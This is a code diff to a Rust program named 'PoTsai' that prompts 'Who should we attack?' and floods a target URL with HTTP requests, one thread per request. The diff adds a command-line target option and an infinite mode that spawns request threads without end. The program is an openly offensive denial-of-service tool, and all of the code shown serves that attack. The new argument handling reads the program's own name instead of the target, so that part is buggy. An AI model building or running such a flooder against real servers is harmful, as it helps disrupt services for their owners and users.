@@ -8,6 +8,7 @@ use tokio_core::reactor::Core;
 use std::io;
 use std::io::Write;
 use std::thread;
+use std::env;
 
 fn read() -> String {
   let mut inp = String::new();
@@ -42,7 +43,7 @@ fn print_n(s: &str) {
 fn new_thread(url: String, t: i64) {
     let name = format!("child{}", t);
     println!("CREATING NEW THREAD ON {}", name);
-    thread::Builder::new().name(name.to_string()).spawn(move || {
+    match thread::Builder::new().name(name.to_string()).spawn(move || {
         // Core is the Tokio event loop used for making a non-blocking request
         let mut core = Core::new().unwrap();
 
@@ -56,16 +57,33 @@ fn new_thread(url: String, t: i64) {
             });
 
         // request is a Future, futures are lazy, so must explicitly run
-        core.run(request).unwrap();
-    }).expect("Failed to make thread...");
+        core.run(request).expect("\n\nSomething went wrong with `core.run`\n\n");
+    }) {
+      Ok(_) => println!("Thread {} exited successfully", name),
+      Err(_) => println!("Thread {} died. Great.", name),
+    }
 }
 
 fn main() {
+  let args: Vec<_> = env::args().collect();
   println!("Welcome to PoTsai!");
-  print_n("Who should we attack? :");
-  let uri = read();
-  print_n("How many requests should be made? :");
+  let mut uri: String;
+  if args.len() < 2 {
+    print_n("Who should we attack? :");
+    uri = read();
+  } else {
+    uri = args[0].clone();
+  }
+  print_n("How many requests should be made? (type -1 for infinte) :");
   let amnt = readi();
+  if amnt == -1 {
+    let mut times: i64 = 0;
+    loop {
+      times += 1;
+      let new = uri.clone();
+      new_thread(new, times);
+    }
+  }
 
   for i in 0..amnt {
       let new = uri.clone();
